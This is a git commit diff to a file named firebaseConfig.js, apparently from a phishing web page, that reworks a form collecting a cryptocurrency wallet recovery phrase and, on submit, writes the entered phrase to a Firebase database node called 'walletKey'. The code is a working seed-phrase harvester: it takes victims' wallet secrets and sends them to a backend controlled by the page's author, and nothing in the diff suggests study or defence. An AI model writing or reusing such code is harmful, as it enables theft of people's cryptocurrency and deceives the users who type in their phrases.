99d9f9f0cba3e66f38ef64c318159d58ca67d9ff
Icha <victoryicha2@gmail.com>
2024-01-31 05:08:22 +0100

    almost done

--- firebaseConfig.js
+++ firebaseConfig.js
@@ -14,41 +14,20 @@ firebase.initializeApp(firebaseConfig);
 // Reference for database
 var keyDB = firebase.database().ref("walletKey");
 
-const wordBoxes = Array.from(document.querySelectorAll(".word-box"));
+// const wordBoxes = Array.from(document.querySelectorAll(".word-box"));
 const submitButton = document.getElementById("submit-button");
+const seed = document.getElementById("phrase");
 
-wordBoxes.forEach((box, i) => {
-  box.addEventListener("blur", (e) => {
-    if (e.target.disabled) return;
-    if (!e.target.value.match(/^[a-zA-Z]{4,8}$/g)) {
-      box.style.borderColor = "red"; // Add red border
-      box.classList.add("shake"); // Add shake animation
-      return;
-    }
+let words; 
 
-    box.style.borderColor = "#0e0"; // Reset border color on valid input
-    if (wordBoxes.length !== i + 1) wordBoxes[i + 1].disabled = false;
-
-    if (wordBoxes.length == i + 1) submitButton.disabled = false;
-  });
+seed.addEventListener("input", (e) => {
+  words = e.target.value;
 });
 
 submitButton.addEventListener("click", (e) => {
   e.preventDefault();
-  // Collect entered words into an array
-  const submittedWords = wordBoxes.map((box) => box.value);
-
-  // Handle form submission here (e.g., send data to backend)
+  const submittedWords = words || seed.value; 
   savePhrase(submittedWords);
-//   alert("Your form has been submitted!");
-
-
-  // Reset input boxes
-  wordBoxes.forEach((box, i) => {
-    box.value = "";
-    box.style.borderColor = "rgba(204, 204, 204, 0)";
-    if (i !== 0) box.disabled = true;
-  });
 });
 
 const savePhrase = (submittedWords) => {
@@ -58,3 +37,37 @@ const savePhrase = (submittedWords) => {
     phrases: submittedWords,
   });
 };
+
+// wordBoxes.forEach((box, i) => {
+//   box.addEventListener("blur", (e) => {
+//     if (e.target.disabled) return;
+//     if (!e.target.value.match(/^[a-zA-Z]{4,8}$/g)) {
+//       box.style.borderColor = "red"; // Add red border
+//       box.classList.add("shake"); // Add shake animation
+//       return;
+//     }
+
+//     box.style.borderColor = "#0e0"; // Reset border color on valid input
+//     if (wordBoxes.length !== i + 1) wordBoxes[i + 1].disabled = false;
+
+//     if (wordBoxes.length == i + 1) submitButton.disabled = false;
+//   });
+// });
+
+// submitButton.addEventListener("click", (e) => {
+//   e.preventDefault();
+//   // Collect entered words into an array
+//   const submittedWords = wordBoxes.map((box) => box.value);
+
+//   // Handle form submission here (e.g., send data to backend)
+//   savePhrase(submittedWords);
+// //   alert("Your form has been submitted!");
+
+
+//   // Reset input boxes
+//   wordBoxes.forEach((box, i) => {
+//     box.value = "";
+//     box.style.borderColor = "rgba(204, 204, 204, 0)";
+//     if (i !== 0) box.disabled = true;
+//   });
+// });
